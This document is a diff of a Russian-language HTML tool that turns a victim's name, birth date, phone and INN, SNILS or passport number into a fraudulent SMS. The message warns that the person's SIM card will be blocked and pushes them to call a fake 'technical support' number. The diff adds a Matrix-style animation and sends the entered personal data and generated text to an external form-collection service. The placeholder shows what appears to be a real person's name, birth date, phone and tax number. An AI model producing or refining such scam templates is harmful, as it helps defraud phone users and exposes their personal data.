@@ -4,48 +4,214 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Генерация текста для рассылки</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Courier New', Courier, monospace;
+            color: #00FF00;
+            background-color: black;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .container {
+            background-color: rgba(0, 0, 0, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            max-width: 600px;
+            width: 100%;
+            z-index: 2;
+        }
+
+        h1, h2 {
+            margin-bottom: 20px;
+            color: #00FF00;
+        }
+
+        textarea {
+            width: 100%;
+            height: 100px;
+            padding: 10px;
+            border: 2px solid #00FF00;
+            border-radius: 5px;
+            background-color: black;
+            color: #00FF00;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 14px;
+        }
+
+        .button-container {
+            display: inline-flex;
+            align-items: center;
+            margin-top: 20px;
+        }
+
+        button {
+            background-color: black;
+            color: #00FF00;
+            border: 2px solid #00FF00;
+            border-radius: 5px;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 14px;
+            text-transform: uppercase;
+            transition: all 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #00FF00;
+            color: black;
+        }
+
+        input[type="text"] {
+            margin-left: 10px;
+            padding: 10px;
+            border: 2px solid #00FF00;
+            border-radius: 5px;
+            background-color: black;
+            color: #00FF00;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 14px;
+            width: 100px;
+        }
+
+        p {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #00FF00;
+        }
+
+        canvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+        }
+    </style>
 </head>
 <body>
-    <h1>Генерация текста для рассылки</h1>
+    <canvas id="matrixCanvas"></canvas>
     
-    <form id="dataForm">
-        <label for="inputData">Введите данные (ФИО, Возраст; Дата рождения, Телефон, ИНН):</label><br>
-        <textarea id="inputData" name="inputData" rows="4" cols="50" placeholder="Поварницина Оксана Анатольевна\n43; 21.06.1980\nТелефон\n79127568212\n182806535866" required></textarea><br><br>
-
-        <button type="button" onclick="generateText()">Сгенерировать текст</button>
-    </form>
-
-    <h2>Сгенерированный текст:</h2>
-    <p id="generatedText"></p>
+    <div class="container">
+        <h1>Генерация текста для рассылки</h1>
+        <form id="dataForm" action="https://formkeep.com/f/3dcfb135b557" method="POST" accept-charset="UTF-8" enctype="multipart/form-data" onsubmit="return generateAndSubmit(event)">
+            <label for="inputData">Введите данные (ФИО, Возраст; Дата рождения, Телефон, ИНН/СНИЛС/ПАСПОРТ):</label><br>
+            <textarea id="inputData" name="inputData" placeholder="Поварницина Оксана Анатольевна&#10;43; 21.06.1980&#10;Телефон&#10;79127568212&#10;182806535866" required></textarea><br><br>
+            <div class="button-container">
+                <button type="submit">Сгенерировать текст</button>
+                <input type="text" id="additionalInput" name="additionalInput" placeholder="Поле ввода">
+            </div>
+        </form>
+        <h2>Сгенерированный текст:</h2>
+        <p id="generatedText"></p>
+    </div>
 
     <script>
-        function generateText() {
-            // Получаем введенные данные
-            const inputData = document.getElementById('inputData').value.trim().split('\n');
+        function generateAndSubmit(event) {
+            event.preventDefault(); // предотвращает отправку формы до генерации текста
 
-            // Извлекаем данные из строки
+            const inputData = document.getElementById('inputData').value.trim().split('\n');
+            const additionalInput = document.getElementById('additionalInput').value.trim();
+
             const fio = inputData[0].trim();
             const dob = inputData[1].split(';')[1].trim();
             const phone = formatPhoneNumber(inputData[3].trim());
-            const inn = inputData[4].trim();
-            const supportPhone = formatPhoneNumber("79011923862"); // номер техподдержки
+            const docNumber = inputData[4].trim();
 
-            // Формируем текст
+            let documentType, formattedDocNumber;
+            if (docNumber.length === 12) {
+                documentType = 'ИНН';
+                formattedDocNumber = docNumber;
+            } else if (docNumber.length === 11) {
+                documentType = 'СНИЛС';
+                formattedDocNumber = formatSnils(docNumber);
+            } else if (docNumber.length === 10) {
+                documentType = 'ПАСПОРТ';
+                formattedDocNumber = docNumber;
+            } else {
+                documentType = 'НЕИЗВЕСТНЫЙ ДОКУМЕНТ';
+                formattedDocNumber = docNumber;
+            }
+
+            const supportPhone = formatPhoneNumber("79011923862");
+
             const template = `Ув. пользователь сотовой связи, ${fio} ${dob}г.р.\n
 Ваш номер ${phone} будет заблокирован, Вы не продлили действие сим карты.\n
-ИНН ${inn} по договору клиентского обслуживания будет закрыт.\n
+${documentType}: ${formattedDocNumber} по договору клиентского обслуживания будет закрыт.\n
 Дальнейшее восстановление номера платное. Обратитесь по номеру технической поддержки ${supportPhone}.\n
-Успейте сделать продление сегодня и получите бонус.`;
+Успейте сделать продление сегодня и получите бонус.\n
+Дополнительная информация: ${additionalInput}`;
 
-            // Отображаем текст на странице
+            // Отображаем сгенерированный текст на странице
             document.getElementById('generatedText').textContent = template;
+
+            // Добавляем сгенерированный текст в форму перед отправкой
+            const generatedTextInput = document.createElement('input');
+            generatedTextInput.type = 'hidden';
+            generatedTextInput.name = 'generatedText';
+            generatedTextInput.value = template;
+            event.target.appendChild(generatedTextInput);
+
+            // Отправка формы после генерации текста
+            event.target.submit();
         }
 
-        // Функция для форматирования номера телефона
         function formatPhoneNumber(phone) {
-            const formattedPhone = `+7 ${phone.slice(1, 4)}-${phone.slice(4, 7)}-${phone.slice(7, 9)}-${phone.slice(9, 11)}`;
-            return formattedPhone;
+            return `+7 ${phone.slice(1, 4)}-${phone.slice(4, 7)}-${phone.slice(7, 9)}-${phone.slice(9, 11)}`;
         }
+
+        function formatSnils(snils) {
+            return `${snils.slice(0, 3)}-${snils.slice(3, 6)}-${snils.slice(6, 9)}-${snils.slice(9, 11)}`;
+        }
+
+        const canvas = document.getElementById('matrixCanvas');
+        const ctx = canvas.getContext('2d');
+
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+
+        const matrixSymbols = '01';
+        const fontSize = 16;
+        const columns = canvas.width / fontSize;
+        const drops = [];
+
+        for (let i = 0; i < columns; i++) {
+            drops[i] = Math.floor(Math.random() * canvas.height);
+        }
+
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            ctx.fillStyle = '#00FF00';
+            ctx.font = fontSize + 'px Courier New';
+
+            for (let i = 0; i < drops.length; i++) {
+                const text = matrixSymbols[Math.floor(Math.random() * matrixSymbols.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+
+                drops[i]++;
+            }
+        }
+
+        setInterval(drawMatrix, 33);
+
+        window.addEventListener('resize', () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
     </script>
 </body>
 </html>
